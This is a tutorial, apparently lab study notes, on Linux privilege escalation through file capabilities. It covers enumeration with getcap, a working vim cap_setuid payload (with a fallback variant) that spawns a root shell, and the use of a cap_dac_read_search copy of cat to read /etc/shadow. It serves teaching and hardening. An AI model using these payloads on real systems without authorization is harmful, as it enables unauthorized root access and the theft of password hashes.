# 🛡️ Linux Privilege Escalation: Linux Capabilities

---

## 1. Core Concept: What are Linux Capabilities?

In traditional Linux security, SUID or sudo often grants **full root-level power**, which is risky.

Linux Capabilities solve this by splitting root privileges into **small, fine-grained permissions**.

---

## Why Capabilities Exist

Instead of giving full root access:

- Only specific privileged actions are allowed
- Each binary gets only what it needs
- Reduces attack surface compared to SUID

---

## Example Concept

Instead of giving full root access to a tool like `cat`, the admin may allow only:

- Read access to protected files

Using capability:

```text
cap_dac_read_search
```

---

# 2. Step-by-Step Exploitation

---

## Step A: Enumeration (Finding Capabilities)

Use the following command:

```bash
getcap -r / 2>/dev/null
```

---

## Command Breakdown

- `getcap` → checks file capabilities
- `-r /` → recursively scan entire filesystem
- `2>/dev/null` → hides permission errors

---

## Interpreting Output

Typical safe binaries:

- `ping`
- `traceroute`

### Suspicious Case Example:

```text
/home/karen/vim = cap_setuid+ep
```

---

# 3. Understanding the Vulnerability

---

## cap_setuid+ep Explained

If a binary has:

```text
cap_setuid
```

It means:

- The binary can change its user ID
- It can escalate privileges internally

---

## Why This is Dangerous

A tool like `vim` normally has no privilege control ability.

But with:

- `cap_setuid`

It can:

- Switch to UID 0 (root)
- Spawn privileged shells

---

## +ep Meaning

- **e = Effective**
- **p = Permitted**

This means capability is active and usable.

---

# 4. Exploitation via GTFOBins

Instead of memorizing commands:

Use GTFOBins and search for the binary (e.g., vim).

---

## Exploit Payload (Example)

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## Result

```bash
whoami
root
```

---

# 🛠️ Troubleshooting Capabilities Exploitation

---

## Error 1: Vim Command Not Recognized

### Problem

```text
Not an editor command: :py3 import os...
```

---

## Root Cause

- Python 3 support missing in Vim
- Incorrect scripting engine used
- Binary compiled without required features

---

## Fix

Try alternative scripting modes:

```bash
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

Or adjust based on available interpreter.

---

# 5. Bonus: Setting Capabilities (Admin Perspective)

---

## Step A: Create Binary Copy

```bash
cp /bin/cat /home/karen/mycat
```

---

## Step B: Assign Capability

```bash
setcap cap_dac_read_search+ep /home/karen/mycat
```

---

## Step C: Verify Capability

```bash
getcap /home/karen/mycat
```

Expected output:

```text
/home/karen/mycat = cap_dac_read_search+ep
```

---

## Step D: Exploitation

Even as a normal user:

```bash
./mycat /etc/shadow
```

---

## Result

- Ability to read protected files
- No full root access required

---

# 🧠 Key Takeaways

---

## Capability Model

| Type | Description |
|------|-------------|
| SUID | Full root-level execution |
| Capabilities | Partial privilege control |

---

## Why Capabilities Matter

- More secure than SUID
- Limits privilege escalation scope
- Reduces attack surface

---

## Exploitation Flow

1. Enumerate capabilities using `getcap`
2. Identify dangerous binaries
3. Check GTFOBins for exploitation
4. Abuse privilege-bearing functions
5. Gain root shell

---

# ⚡ Security Insight

Capabilities become dangerous when:

- Assigned to interactive binaries (vim, python, perl)
- Misconfigured with `cap_setuid`
- Combined with scripting features

---

# 🧠 Final Summary

Linux capabilities provide controlled privilege delegation, but misconfiguration can still lead to full root compromise—especially when assigned to powerful binaries like editors or interpreters.

---
